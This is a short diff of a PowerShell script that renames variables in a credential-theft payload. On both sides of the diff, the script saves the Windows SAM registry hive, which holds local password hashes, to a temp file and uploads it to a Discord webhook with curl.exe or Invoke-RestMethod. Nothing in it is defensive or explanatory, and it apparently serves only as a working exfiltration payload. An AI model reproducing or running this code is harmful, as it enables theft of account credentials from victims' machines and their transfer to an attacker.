@@ -1,6 +1,7 @@
-$Fich = "$env:tmp/$env:USERNAME-SAM-$(get-date -f yyyy-MM-dd_hh-mm ).txt"
-$CO = "reg save hklm\sam $Fich"
-Invoke-Expression -Command $CO
+$FileName = "$env:tmp/$env:USERNAME-SAM-$(get-date -f yyyy-MM-dd_hh-mm ).txt"
+$regCommand = "reg save hklm\sam $FileName"
+Invoke-Expression -Command $regCommand
+
 
 function Upload-Discord {
 
@@ -12,7 +13,7 @@ param (
     [string]$text 
 )
 
-$didi = "$dc"
+$hookurl = "$dc"
 
 $Body = @{
   'username' = $env:username
@@ -20,9 +21,9 @@ $Body = @{
 }
 
 if (-not ([string]::IsNullOrEmpty($text))){
-Invoke-RestMethod -ContentType 'Application/Json' -Uri $didi  -Method Post -Body ($Body | ConvertTo-Json)};
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
 
-if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $didi}
+if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
 
-if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$Fich"}
+if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$FileName"}
